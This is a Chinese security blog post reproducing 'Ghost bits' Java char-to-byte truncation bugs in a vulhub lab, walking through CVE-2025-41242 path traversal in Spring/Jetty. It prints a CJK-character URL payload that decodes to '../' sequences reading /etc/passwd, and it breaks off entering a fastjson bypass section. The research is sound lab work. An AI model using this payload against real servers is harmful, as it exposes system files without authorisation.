@@ -1,0 +1,2056 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Ghost bits复现分析 漏洞复现环境：\nhttps://github.com/vulhub/vulhub/tree/master/spring/CVE-2025-41242\nBlack Hat Asia 2026议题PPT：\nhttps://i.blackhat.com/Asia-26/Presentations/Asia-26-Bai-Cast-Attack-Ghost-Bits-4.23.pdf\n原理 java中的char类型和byte类型的转换导致的漏洞，char类型是16位，byte是8位，当代码用(byte)ch、ch &amp; 0xFF、baos.write(ch)、DataOutputStream#writeBytes()这类写法把char强转成byte时，高8位会被静默丢弃，只保留低8位。\n">
+<title>Ghost bits复现分析</title>
+
+<link rel='canonical' href='https://0d000721999.github.io/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/'>
+
+<link rel="stylesheet" href="/scss/style.min.37a6022266b4205ec3a616ff86e34064f3524e0913faf185a3d362063a8d7490.css"><meta property='og:title' content="Ghost bits复现分析">
+<meta property='og:description' content="Ghost bits复现分析 漏洞复现环境：\nhttps://github.com/vulhub/vulhub/tree/master/spring/CVE-2025-41242\nBlack Hat Asia 2026议题PPT：\nhttps://i.blackhat.com/Asia-26/Presentations/Asia-26-Bai-Cast-Attack-Ghost-Bits-4.23.pdf\n原理 java中的char类型和byte类型的转换导致的漏洞，char类型是16位，byte是8位，当代码用(byte)ch、ch &amp; 0xFF、baos.write(ch)、DataOutputStream#writeBytes()这类写法把char强转成byte时，高8位会被静默丢弃，只保留低8位。\n">
+<meta property='og:url' content='https://0d000721999.github.io/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/'>
+<meta property='og:site_name' content='美咕噜的小站'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='java' /><meta property='article:tag' content='ghost bits' /><meta property='article:published_time' content='2026-05-07T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2026-05-07T00:00:00&#43;00:00'/><meta property='og:image' content='https://0d000721999.github.io/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/1.png' />
+<meta name="twitter:title" content="Ghost bits复现分析">
+<meta name="twitter:description" content="Ghost bits复现分析 漏洞复现环境：\nhttps://github.com/vulhub/vulhub/tree/master/spring/CVE-2025-41242\nBlack Hat Asia 2026议题PPT：\nhttps://i.blackhat.com/Asia-26/Presentations/Asia-26-Bai-Cast-Attack-Ghost-Bits-4.23.pdf\n原理 java中的char类型和byte类型的转换导致的漏洞，char类型是16位，byte是8位，当代码用(byte)ch、ch &amp; 0xFF、baos.write(ch)、DataOutputStream#writeBytes()这类写法把char强转成byte时，高8位会被静默丢弃，只保留低8位。\n"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://0d000721999.github.io/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/1.png' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            localStorage.setItem(colorSchemeKey, "light");
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu988272603220494224.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">😋</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">美咕噜的小站</a></h1>
+            <h2 class="site-description">Ciallo～(∠・ω&lt; )⌒★</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://buuoj.cn/users/175721'
+                        target="_blank"
+                        title="BUUOJ"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-letter-b" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M7 20v-16h6a4 4 0 0 1 0 8a4 4 0 0 1 0 8h-6" />
+  <line x1="7" y1="12" x2="13" y2="12" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/0d000721999'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/friends/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                
+                <span>Friends</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#原理">原理</a></li>
+    <li><a href="#cve-2025-41242">CVE-2025-41242</a></li>
+    <li><a href="#fastjson">fastjson</a>
+      <ol>
+        <li><a href="#x4_-bypass">\x4_ bypass</a></li>
+        <li><a href="#u0040-bypass"><strong>\u0040</strong> bypass</a></li>
+      </ol>
+    </li>
+    <li><a href="#jackson">jackson</a></li>
+    <li><a href="#becl">becl</a></li>
+    <li><a href="#tomcat-upload">tomcat upload</a></li>
+    <li><a href="#urldecoder">URLDecoder</a></li>
+    <li><a href="#小结">小结</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/">
+                <img src="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/1.png"
+                        
+                        width="3434" 
+                        height="1915" 
+                        loading="lazy"
+                        alt="Featured image of post Ghost bits复现分析" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/java/" style="background-color: #264653; color: #fff;">
+                Java
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/">Ghost bits复现分析</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">May 07, 2026</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 7 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="ghost-bits复现分析">Ghost bits复现分析
+</h1><p><strong>漏洞复现环境：</strong></p>
+<p><a class="link" href="https://github.com/vulhub/vulhub/tree/master/spring/CVE-2025-41242"  target="_blank" rel="noopener"
+    >https://github.com/vulhub/vulhub/tree/master/spring/CVE-2025-41242</a></p>
+<p><strong>Black Hat Asia 2026议题PPT：</strong></p>
+<p><a class="link" href="https://i.blackhat.com/Asia-26/Presentations/Asia-26-Bai-Cast-Attack-Ghost-Bits-4.23.pdf"  target="_blank" rel="noopener"
+    >https://i.blackhat.com/Asia-26/Presentations/Asia-26-Bai-Cast-Attack-Ghost-Bits-4.23.pdf</a></p>
+<h2 id="原理">原理
+</h2><p>java中的char类型和byte类型的转换导致的漏洞，char类型是16位，byte是8位，当代码用<code>(byte)ch</code>、<code>ch &amp; 0xFF</code>、<code>baos.write(ch)</code>、<code>DataOutputStream#writeBytes()</code>这类写法把char强转成byte时，<strong>高8位会被静默丢弃，只保留低8位</strong>。</p>
+<p>以议题的例子来说明:<code>⽘</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">汉字</span><span class="err">「</span><span class="n">爻</span><span class="err">」</span><span class="p">(</span><span class="n">U</span><span class="o">+</span><span class="n">2F58</span><span class="p">)</span><span class="w"> </span><span class="n">二进制是</span><span class="w"> </span><span class="n">00101111</span><span class="w"> </span><span class="n">00111010</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">强转byte后</span><span class="err">，</span><span class="n">高</span><span class="w"> </span><span class="n">8</span><span class="w"> </span><span class="n">位</span><span class="w"> </span><span class="n">0x2F</span><span class="w"> </span><span class="n">被丢弃</span><span class="err">，</span><span class="n">只剩低</span><span class="w"> </span><span class="n">8</span><span class="w"> </span><span class="n">位</span><span class="w"> </span><span class="n">0x3A</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="sc">&#39;X&#39;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>所以只要在存在强转byte类型的地方，攻击者就可以通过构造低8位有意义，整体无意义的字符来bypass,导致很多高危漏洞复活</p>
+<h2 id="cve-2025-41242">CVE-2025-41242
+</h2><p>p神做的靶场，那就先复现一下这个spring+jetty的漏洞吧，这里顺便记录一下怎么用idea远程调试</p>
+<p>先去docker里面把源码下下来,运行配置这里选择远程JVM调试就行了，这里注意本地和远程的源码一定要一样才能调试</p>
+<p><img src="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260507214442951.png"
+	width="1016"
+	height="874"
+	srcset="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260507214442951_hu9390139181142833196.png 480w, /p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260507214442951_hu14343462860560633946.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260507214442951"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="116"
+		data-flex-basis="278px"
+	
+></p>
+<p>直接在StringUntils这个类的uriDecode方法下断点，直接发payload就断下来了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/etc/passw%64
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260507223457797.png"
+	width="1920"
+	height="1030"
+	srcset="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260507223457797_hu3454718164841826037.png 480w, /p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260507223457797_hu2946045141765036176.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260507223457797"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="186"
+		data-flex-basis="447px"
+	
+></p>
+<p>注意观察此时的变量，我们传入了<code>/a/b/c</code>这种格式的url，这里是分开解析，依次对a,b,c进行解码，这里的ghost bits漏洞存在于<code>baos.write(ch)</code></p>
+<p><img src="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260507224541321.png"
+	width="1421"
+	height="806"
+	srcset="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260507224541321_hu3462159178637689152.png 480w, /p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260507224541321_hu13052507453801077022.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260507224541321"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="176"
+		data-flex-basis="423px"
+	
+></p>
+<p>注意看这里，ch是int类型的，这里实际上调用的是<code>ByteArrayOutputStream#write(int)</code></p>
+<p>关于这个write函数</p>
+<p><img src="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260507225113720.png"
+	width="871"
+	height="490"
+	srcset="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260507225113720_hu16075164990359887113.png 480w, /p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260507225113720_hu7557795756665580008.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260507225113720"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="177"
+		data-flex-basis="426px"
+	
+></p>
+<p>这里并没有给出解释，但是官方文档写了https://docs.oracle.com/javase/8/docs/api/java/io/OutputStream.html#write-byte:A-</p>
+<p><img src="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260507225138008.png"
+	width="1855"
+	height="442"
+	srcset="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260507225138008_hu5008772107545731582.png 480w, /p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260507225138008_hu1464724262741730602.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260507225138008"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="419"
+		data-flex-basis="1007px"
+	
+></p>
+<p>可以看到int类型转byte类型，丢弃了前面高位的24位，剩下低位的8位</p>
+<p>以payload中的第一个字符为例</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">阮的二进制0000</span><span class="w"> </span><span class="n">0000</span><span class="w">  </span><span class="n">0000</span><span class="w"> </span><span class="n">0000</span><span class="w">  </span><span class="n">1001</span><span class="w"> </span><span class="n">0110</span><span class="w">  </span><span class="n">0010</span><span class="w"> </span><span class="n">1110</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">取低8位后变成0010</span><span class="w"> </span><span class="n">1110</span><span class="err">，</span><span class="n">也就是0x2E</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39;.&#39;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后上面还有要注意的点，最后的changed变量一定要为true，否则返回source，也就是不解析，所以一定要进一次if判断，也就是字符里面得有至少一个<code>%</code>,一定要有一个字符进行url编码，所以这里如果只传入<code>阮严灵丰丰甲来</code>是不会解析的，要变成<code>%2e严灵丰丰甲来</code>才能被解析成<code>.%u002e</code></p>
+<p>不过好在最后有对整个payload进行一次解析</p>
+<p><img src="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260507230804632.png"
+	width="1346"
+	height="350"
+	srcset="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260507230804632_hu9496096591692082643.png 480w, /p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260507230804632_hu11116037924661928007.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260507230804632"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="384"
+		data-flex-basis="922px"
+	
+></p>
+<p>然后解码完现在的url变为</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">/</span><span class="p">.</span><span class="o">%</span><span class="n">u002e</span><span class="o">/</span><span class="p">.</span><span class="o">%</span><span class="n">u002e</span><span class="o">/</span><span class="p">.</span><span class="o">%</span><span class="n">u002e</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后会进到</p>
+<p><img src="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260507231403894.png"
+	width="1255"
+	height="610"
+	srcset="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260507231403894_hu6724646052177419363.png 480w, /p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260507231403894_hu17171260685500791548.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260507231403894"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="205"
+		data-flex-basis="493px"
+	
+></p>
+<p>跟进去看一下怎么校验的</p>
+<p><img src="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260507232732231.png"
+	width="954"
+	height="573"
+	srcset="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260507232732231_hu853811064017383573.png 480w, /p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260507232732231_hu17734999025756199257.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260507232732231"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="166"
+		data-flex-basis="399px"
+	
+></p>
+<p>当存在两个点的时候，例如<code>../</code>,把 canonical 里面的最后一级目录删掉（退回上一级），返回 false。<strong>如果已经退无可退（到了根目录还要往上退），就会返回 true（表示非法）。</strong></p>
+<p>接下来走到addPath这里</p>
+<p><img src="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260507232907214.png"
+	width="1109"
+	height="528"
+	srcset="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260507232907214_hu782592472182581280.png 480w, /p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260507232907214_hu13839393009422516820.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260507232907214"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="210"
+		data-flex-basis="504px"
+	
+></p>
+<p>跟进</p>
+<p><img src="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260507233232339.png"
+	width="1109"
+	height="528"
+	srcset="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260507233232339_hu782592472182581280.png 480w, /p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260507233232339_hu13839393009422516820.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260507233232339"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="210"
+		data-flex-basis="504px"
+	
+></p>
+<p><img src="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260507234223286.png"
+	width="1109"
+	height="468"
+	srcset="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260507234223286_hu461206119347746997.png 480w, /p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260507234223286_hu8365447829048261256.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260507234223286"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="236"
+		data-flex-basis="568px"
+	
+></p>
+<p>然后最后解码完变</p>
+<p><img src="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260507234141136.png"
+	width="1172"
+	height="364"
+	srcset="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260507234141136_hu10052631608256276155.png 480w, /p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260507234141136_hu13964894572346269306.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260507234141136"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="321"
+		data-flex-basis="772px"
+	
+></p>
+<p><img src="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260507234528184.png"
+	width="1281"
+	height="567"
+	srcset="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260507234528184_hu11528887772602602332.png 480w, /p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260507234528184_hu584000757796859504.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260507234528184"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="225"
+		data-flex-basis="542px"
+	
+></p>
+<p>就穿越出来了</p>
+<p><img src="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260507235711839.png"
+	width="1844"
+	height="683"
+	srcset="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260507235711839_hu17206074344027227034.png 480w, /p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260507235711839_hu3569373151483207672.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260507235711839"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="269"
+		data-flex-basis="647px"
+	
+></p>
+<h2 id="fastjson">fastjson
+</h2><p>引用议题的图片：</p>
+<p><img src="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260515205901723.png"
+	width="1565"
+	height="790"
+	srcset="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260515205901723_hu6292490399515969121.png 480w, /p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260515205901723_hu10511555143361306007.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260515205901723"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="198"
+		data-flex-basis="475px"
+	
+></p>
+<p><img src="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260515205911896.png"
+	width="1524"
+	height="722"
+	srcset="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260515205911896_hu14128364142114687965.png 480w, /p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260515205911896_hu5872307937638185001.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260515205911896"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="211"
+		data-flex-basis="506px"
+	
+></p>
+<p>这里介绍了两种bypass方法用来绕过，这里上面用<code>@</code>为例，所以我们直接跟进这段源码看看</p>
+<h3 id="x4_-bypass">\x4_ bypass
+</h3><p>我们都知道fastjson有<code>\x40</code>这样的bypass,如</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
